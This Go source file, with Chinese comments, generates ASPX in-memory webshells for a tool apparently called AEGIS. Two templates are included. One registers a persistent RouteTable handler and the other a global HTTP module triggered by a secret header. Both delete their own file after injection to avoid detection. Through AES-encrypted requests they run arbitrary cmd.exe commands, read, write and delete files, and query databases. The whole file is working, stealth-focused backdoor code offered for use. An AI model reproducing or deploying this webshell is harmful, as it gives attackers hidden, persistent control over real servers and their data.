package webshell

import "strings"

// MemShellASPX 生成 ASPX (.NET) 内存马注入代码。
// msType: "handler"（IHttpHandler via RouteTable，推荐）| "module"（IHttpModule via RegisterModule，无固定 URL）
// handler 类型注入后返回持久路由路径；module 类型拦截所有请求，返回 "X-AEGIS-KEY:{tag}" 用作请求头。
func MemShellASPX(msType, password string) string {
	key16 := deriveKey(password)
	tag := randTag()
	switch msType {
	case "module":
		return aspxMemShellModule(key16, tag)
	default:
		return aspxMemShellHandler(key16, tag)
	}
}

// aspxMemShellHandler 生成 IHttpHandler 类型 ASPX 内存马。
// 注入原理：ASPX 首次被请求时 ASP.NET 将代码编译进 AppDomain；
// 在 RouteTable 注册路由后，即使原文件被删除，路由仍持续有效直至应用池重启。
// 与正常 ASPX Shell 使用相同的 AES-128-CBC 行协议，可直接用 AEGIS sendASPX 通信。
func aspxMemShellHandler(key16, tag string) string {
	tmpl := `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Web.Routing" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    Response.ContentType = "application/json";
    try {
        const string rn = "AegisMem_«TAG»", rp = "__am_«TAG»";
        if (RouteTable.Routes[rn] != null) RouteTable.Routes.Remove(RouteTable.Routes[rn]);
        RouteTable.Routes.Add(rn, new Route(rp, new AegisRH_«TAG»()));
        try { System.IO.File.Delete(Request.PhysicalPath); } catch {}
        Response.Write("{\"status\":\"200\",\"msg\":\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("/" + rp)) + "\"}");
    } catch (Exception ex) {
        Response.Write("{\"status\":\"500\",\"msg\":\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("err:" + ex.Message)) + "\"}");
    }
}
class AegisRH_«TAG» : IRouteHandler {
    public IHttpHandler GetHttpHandler(RequestContext ctx) => new AegisH_«TAG»();
}
class AegisH_«TAG» : IHttpHandler {
    static readonly byte[] K = System.Text.Encoding.UTF8.GetBytes("«KEY»");
    public bool IsReusable => true;
    public void ProcessRequest(HttpContext c) {
        c.Response.ContentType = "application/json";
        try {
            var ms = new System.IO.MemoryStream(); c.Request.InputStream.CopyTo(ms); byte[] body = ms.ToArray();
            if (body.Length == 0) { c.Response.Write(R("hello")); return; }
            string txt = System.Text.Encoding.UTF8.GetString(Dec(Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(body))));
            string[] lns = txt.Split('\n');
            string act = lns[0].Trim();
            byte[] a0 = lns.Length > 1 && lns[1].Trim() != "" ? Convert.FromBase64String(lns[1].Trim()) : new byte[0];
            byte[] a1 = lns.Length > 2 && lns[2].Trim() != "" ? Convert.FromBase64String(lns[2].Trim()) : new byte[0];
            switch (act) {
            case "info": {
                string os=Environment.OSVersion.ToString(), sv=c.Request.ServerVariables["SERVER_SOFTWARE"]??"",
                    pv=".NET "+Environment.Version.ToString(), cwd=AppDomain.CurrentDomain.BaseDirectory,
                    usr=Environment.UserName, hn=Environment.MachineName, ip=c.Request.ServerVariables["LOCAL_ADDR"]??"";
                c.Response.Write(R("{\"os\":\""+EJ(os)+"\",\"server\":\""+EJ(sv)+"\",\"php\":\""+EJ(pv)+"\",\"cwd\":\""+EJ(cwd)+"\",\"user\":\""+EJ(usr)+"\",\"hostname\":\""+EJ(hn)+"\",\"ip\":\""+EJ(ip)+"\"}"));
                break; }
            case "exec": {
                string cmd = System.Text.Encoding.UTF8.GetString(a0);
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) { UseShellExecute=false, RedirectStandardOutput=true, RedirectStandardError=true, CreateNoWindow=true };
                var proc = Process.Start(psi); string out1 = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd(); proc.WaitForExit();
                c.Response.Write(R(out1)); break; }
            case "ls": {
                var di = new System.IO.DirectoryInfo(System.Text.Encoding.UTF8.GetString(a0));
                var sb = new System.Text.StringBuilder("["); bool first = true;
                foreach (var d in di.GetDirectories()) { if (!first) sb.Append(","); first=false; long mt=(long)(d.LastWriteTimeUtc-new DateTime(1970,1,1)).TotalSeconds; sb.Append("{\"name\":\""+EJ(d.Name)+"\",\"isDir\":true,\"size\":0,\"mtime\":"+mt+",\"perms\":\"rwx\"}"); }
                foreach (var f in di.GetFiles()) { if (!first) sb.Append(","); first=false; long mt=(long)(f.LastWriteTimeUtc-new DateTime(1970,1,1)).TotalSeconds; sb.Append("{\"name\":\""+EJ(f.Name)+"\",\"isDir\":false,\"size\":"+f.Length+",\"mtime\":"+mt+",\"perms\":\"rw-\"}"); }
                sb.Append("]"); c.Response.Write(R(sb.ToString())); break; }
            case "read":
                c.Response.Write(R(Convert.ToBase64String(System.IO.File.ReadAllBytes(System.Text.Encoding.UTF8.GetString(a0))))); break;
            case "write":
                System.IO.File.WriteAllBytes(System.Text.Encoding.UTF8.GetString(a0), a1); c.Response.Write(R("ok")); break;
            case "delete": {
                string dp = System.Text.Encoding.UTF8.GetString(a0);
                if (System.IO.Directory.Exists(dp)) System.IO.Directory.Delete(dp,true); else System.IO.File.Delete(dp);
                c.Response.Write(R("ok")); break; }
            case "mkdir":
                System.IO.Directory.CreateDirectory(System.Text.Encoding.UTF8.GetString(a0)); c.Response.Write(R("ok")); break;
            case "rename": {
                string src2=System.Text.Encoding.UTF8.GetString(a0), dst2=System.Text.Encoding.UTF8.GetString(a1);
                if (System.IO.Directory.Exists(src2)) System.IO.Directory.Move(src2,dst2); else System.IO.File.Move(src2,dst2);
                c.Response.Write(R("ok")); break; }
            case "db_query": {
                string tp=System.Text.Encoding.UTF8.GetString(a0), h2=lns.Length>2&&lns[2].Trim()!=""?System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(lns[2].Trim())):"",
                    po2=lns.Length>3&&lns[3].Trim()!=""?System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(lns[3].Trim())):"",
                    db2=lns.Length>4&&lns[4].Trim()!=""?System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(lns[4].Trim())):"",
                    us2=lns.Length>5&&lns[5].Trim()!=""?System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(lns[5].Trim())):"",
                    pw2=lns.Length>6&&lns[6].Trim()!=""?System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(lns[6].Trim())):"",
                    sq2=lns.Length>7&&lns[7].Trim()!=""?System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(lns[7].Trim())):"";
                c.Response.Write(R(ASPXDB(tp,h2,po2,db2,us2,pw2,sq2))); break; }
            default: c.Response.Write(R("unknown:" + act)); break;
            }
        } catch (Exception ex) { c.Response.Write(R("err:" + ex.Message)); }
    }
    static string ASPXDB(string tp,string h,string po,string db,string us,string pw,string sq) {
        try {
            System.Data.Common.DbConnection con;
            if (tp=="mssql"||tp=="sqlserver") {
                string cs="Server="+h+(po!=""?","+po:"")+";Database="+db+";User Id="+us+";Password="+pw+";";
                con=new System.Data.SqlClient.SqlConnection(cs);
            } else {
                // 尝试通过反射加载 MySQL/PostgreSQL 驱动
                string asm="",cls="",cs="";
                if(tp=="mysql"){asm="MySql.Data";cls="MySql.Data.MySqlClient.MySqlConnection";cs="server="+h+";port="+po+";database="+db+";uid="+us+";pwd="+pw+";";}
                else if(tp=="postgresql"){asm="Npgsql";cls="Npgsql.NpgsqlConnection";cs="Host="+h+";Port="+po+";Database="+db+";Username="+us+";Password="+pw+";";}
                else return "{\"error\":\"unsupported db type for ASPX: "+tp+"\",\"headers\":[],\"rows\":[]}";
                System.Reflection.Assembly a2=System.Reflection.Assembly.Load(asm);
                con=(System.Data.Common.DbConnection)a2.CreateInstance(cls,false,System.Reflection.BindingFlags.Default,null,new object[]{cs},null,null);
            }
            con.Open();
            var cmd=con.CreateCommand(); cmd.CommandText=sq;
            var reader=cmd.ExecuteReader();
            var hdrs=new System.Text.StringBuilder("["); var rows=new System.Text.StringBuilder("[");
            bool hdr=true; bool fr=true;
            while(reader.Read()) {
                if(hdr){for(int i=0;i<reader.FieldCount;i++){if(i>0)hdrs.Append(",");hdrs.Append("\""+EJ(reader.GetName(i))+"\"");}hdrs.Append("]");hdr=false;}
                if(!fr)rows.Append(","); fr=false; rows.Append("[");
                for(int i=0;i<reader.FieldCount;i++){if(i>0)rows.Append(",");var v=reader.GetValue(i);if(v==null||v==DBNull.Value)rows.Append("null");else rows.Append("\""+EJ(v.ToString())+"\"");}
                rows.Append("]");
            }
            if(hdr){hdrs.Append("]");}rows.Append("]");
            reader.Close(); con.Close();
            return "{\"headers\":"+hdrs.ToString()+",\"rows\":"+rows.ToString()+"}";
        } catch(Exception dbex){return "{\"error\":\""+EJ(dbex.Message)+"\",\"headers\":[],\"rows\":[]}";}
    }
    static string EJ(string s) { if(s==null)return ""; return s.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r","\\r").Replace("\n","\\n"); }
    static string R(string s) { return "{\"status\":\"200\",\"msg\":\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(s)) + "\"}"; }
    static byte[] Dec(byte[] d) { using(var a=new RijndaelManaged()){a.KeySize=128;a.BlockSize=128;a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;a.Key=K;a.IV=K;using(var dc=a.CreateDecryptor())return dc.TransformFinalBlock(d,0,d.Length);} }
}
</script>`

	result := strings.ReplaceAll(tmpl, "«KEY»", key16)
	result = strings.ReplaceAll(result, "«TAG»", tag)
	return result
}

// aspxMemShellModule 生成 IHttpModule 类型 ASPX 内存马（更隐蔽，无固定 URL）。
// 注入原理：调用 System.Web.HttpApplication.RegisterModule（.NET 4.5+ 支持）
// 注册全局 HTTP 模块，拦截所有请求检查魔术请求头。
// 使用方式：注入成功后将返回的 tag 值写入 AEGIS Shell 自定义请求头：X-AEGIS-KEY: {tag}
// 然后将 AEGIS Shell URL 设置为站点任意已知页面（如 /index.aspx），AEGIS 将通过该模块通信。
func aspxMemShellModule(key16, tag string) string {
	tmpl := `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    Response.ContentType = "application/json";
    try {
        System.Web.HttpApplication.RegisterModule(typeof(AegisMod_«TAG»));
        try { System.IO.File.Delete(Request.PhysicalPath); } catch {}
        Response.Write("{\"status\":\"200\",\"msg\":\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("module:X-AEGIS-KEY:«TAG»")) + "\"}");
    } catch (Exception ex) {
        Response.Write("{\"status\":\"500\",\"msg\":\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("err:" + ex.Message)) + "\"}");
    }
}
class AegisMod_«TAG» : System.Web.IHttpModule {
    static readonly byte[] K = System.Text.Encoding.UTF8.GetBytes("«KEY»");
    const string HDR = "«TAG»";
    public void Init(System.Web.HttpApplication app) { app.BeginRequest += OnBegin; }
    public void Dispose() {}
    static void OnBegin(object sender, EventArgs e) {
        var c = ((System.Web.HttpApplication)sender).Context;
        if (c.Request.Headers["X-AEGIS-KEY"] != HDR) return;
        c.Response.ContentType = "application/json";
        try {
            var ms = new System.IO.MemoryStream(); c.Request.InputStream.CopyTo(ms); byte[] body = ms.ToArray();
            if (body.Length == 0) { c.Response.Write(R("hello")); c.Response.End(); return; }
            string txt = System.Text.Encoding.UTF8.GetString(Dec(Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(body))));
            string[] lns = txt.Split('\n');
            string act = lns[0].Trim();
            byte[] a0 = lns.Length > 1 && lns[1].Trim() != "" ? Convert.FromBase64String(lns[1].Trim()) : new byte[0];
            byte[] a1 = lns.Length > 2 && lns[2].Trim() != "" ? Convert.FromBase64String(lns[2].Trim()) : new byte[0];
            switch (act) {
            case "info": {
                string os=Environment.OSVersion.ToString(), sv=c.Request.ServerVariables["SERVER_SOFTWARE"]??"",
                    pv=".NET "+Environment.Version.ToString(), cwd=AppDomain.CurrentDomain.BaseDirectory,
                    usr=Environment.UserName, hn=Environment.MachineName, ip=c.Request.ServerVariables["LOCAL_ADDR"]??"";
                c.Response.Write(R("{\"os\":\""+EJ(os)+"\",\"server\":\""+EJ(sv)+"\",\"php\":\""+EJ(pv)+"\",\"cwd\":\""+EJ(cwd)+"\",\"user\":\""+EJ(usr)+"\",\"hostname\":\""+EJ(hn)+"\",\"ip\":\""+EJ(ip)+"\"}"));
                break; }
            case "exec": {
                string cmd = System.Text.Encoding.UTF8.GetString(a0);
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) { UseShellExecute=false, RedirectStandardOutput=true, RedirectStandardError=true, CreateNoWindow=true };
                var proc = Process.Start(psi); string out1 = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd(); proc.WaitForExit();
                c.Response.Write(R(out1)); break; }
            case "ls": {
                var di = new System.IO.DirectoryInfo(System.Text.Encoding.UTF8.GetString(a0));
                var sb = new System.Text.StringBuilder("["); bool first = true;
                foreach (var d in di.GetDirectories()) { if (!first) sb.Append(","); first=false; long mt=(long)(d.LastWriteTimeUtc-new DateTime(1970,1,1)).TotalSeconds; sb.Append("{\"name\":\""+EJ(d.Name)+"\",\"isDir\":true,\"size\":0,\"mtime\":"+mt+",\"perms\":\"rwx\"}"); }
                foreach (var f in di.GetFiles()) { if (!first) sb.Append(","); first=false; long mt=(long)(f.LastWriteTimeUtc-new DateTime(1970,1,1)).TotalSeconds; sb.Append("{\"name\":\""+EJ(f.Name)+"\",\"isDir\":false,\"size\":"+f.Length+",\"mtime\":"+mt+",\"perms\":\"rw-\"}"); }
                sb.Append("]"); c.Response.Write(R(sb.ToString())); break; }
            case "read":
                c.Response.Write(R(Convert.ToBase64String(System.IO.File.ReadAllBytes(System.Text.Encoding.UTF8.GetString(a0))))); break;
            case "write":
                System.IO.File.WriteAllBytes(System.Text.Encoding.UTF8.GetString(a0), a1); c.Response.Write(R("ok")); break;
            case "delete": {
                string dp = System.Text.Encoding.UTF8.GetString(a0);
                if (System.IO.Directory.Exists(dp)) System.IO.Directory.Delete(dp,true); else System.IO.File.Delete(dp);
                c.Response.Write(R("ok")); break; }
            case "mkdir":
                System.IO.Directory.CreateDirectory(System.Text.Encoding.UTF8.GetString(a0)); c.Response.Write(R("ok")); break;
            case "rename": {
                string src2=System.Text.Encoding.UTF8.GetString(a0), dst2=System.Text.Encoding.UTF8.GetString(a1);
                if (System.IO.Directory.Exists(src2)) System.IO.Directory.Move(src2,dst2); else System.IO.File.Move(src2,dst2);
                c.Response.Write(R("ok")); break; }
            default: c.Response.Write(R("unknown:" + act)); break;
            }
        } catch (Exception ex) { c.Response.Write(R("err:" + ex.Message)); }
        c.Response.End();
    }
    static string EJ(string s) { if(s==null)return ""; return s.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r","\\r").Replace("\n","\\n"); }
    static string R(string s) { return "{\"status\":\"200\",\"msg\":\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(s)) + "\"}"; }
    static byte[] Dec(byte[] d) { using(var a=new RijndaelManaged()){a.KeySize=128;a.BlockSize=128;a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;a.Key=K;a.IV=K;using(var dc=a.CreateDecryptor())return dc.TransformFinalBlock(d,0,d.Length);} }
}
</script>`

	result := strings.ReplaceAll(tmpl, "«KEY»", key16)
	result = strings.ReplaceAll(result, "«TAG»", tag)
	return result
}
